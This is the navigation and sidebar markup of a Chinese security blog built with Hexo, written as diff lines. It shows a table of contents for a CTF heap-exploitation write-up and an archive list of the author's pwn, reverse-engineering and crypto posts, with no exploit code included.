+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PAYLOAD"><span class="toc-number">1.</span> <span class="toc-text">PAYLOAD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#功能分析"><span class="toc-number">2.</span> <span class="toc-text">功能分析:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init"><span class="toc-number">2.1.</span> <span class="toc-text">init</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create"><span class="toc-number">2.2.</span> <span class="toc-text">create</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete"><span class="toc-number">2.3.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit"><span class="toc-number">2.4.</span> <span class="toc-text">edit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bookread"><span class="toc-number">2.5.</span> <span class="toc-text">bookread</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cinname"><span class="toc-number">2.6.</span> <span class="toc-text">cinname</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实现越界读"><span class="toc-number">3.1.</span> <span class="toc-text">实现越界读</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露libc"><span class="toc-number">3.2.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任意写"><span class="toc-number">3.3.</span> <span class="toc-text">任意写</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2021/04/17/%C2%960ctf-2017-babyheap/" >0ctf_2017_babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2021/04/16/b00ks/" >b00ks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2021/03/23/usb-new/" >USB简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2021/03/23/%C2%96arm/" >ARM汇编总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2021/03/23/size-t/" >size_t</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2021/01/22/net/" >qemu常用网络命令:SSH代理和SCP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2021/01/22/env/" >MIPS/ARM动态调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2021/01/22/qdlc/" >启动流程</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2020/12/17/router-tools/" >router-tools</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href= "/2020/12/04/runit/" >runit</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span><a class="archive-post-title" href= "/2020/12/03/shell/" >shell指令学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2020/11/25/nctf2020/" >nctf2020RE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2020/11/20/xtdy/" >通用gadgets(__libc_csu_init)利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2020/07/01/3dsctf/" >get_started_3dsctf_2016</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span><a class="archive-post-title" href= "/2020/02/13/hongbao3/" >ctf.show红包题2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span><a class="archive-post-title" href= "/2020/02/12/buuctf-re3/" >buuctf_re3(base64)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2019/11/01/CVE-2018-12613/" >CVE-2018-12613 phpadmin文件包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2019/11/01/cbcsafety-md/" >CBC安全问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2019/11/01/ecbcbc-md/" >(ECB,CBC)分组密码的算法类型及模式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2019/11/01/des/" >DES加密步骤详解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2019/03/11/rsa/" >rsa</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT Pwn"><span class="iconfont-archer">&#xe606;</span>IOT Pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Re"><span class="iconfont-archer">&#xe606;</span>Re</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="通信"><span class="iconfont-archer">&#xe606;</span>通信</span>
+    
+        <span class="sidebar-tag-name" data-tags="C/C++"><span class="iconfont-archer">&#xe606;</span>C/C++</span>
+    
+        <span class="sidebar-tag-name" data-tags="Shell"><span class="iconfont-archer">&#xe606;</span>Shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="ARM Pwn"><span class="iconfont-archer">&#xe606;</span>ARM Pwn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Yk2eR0"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
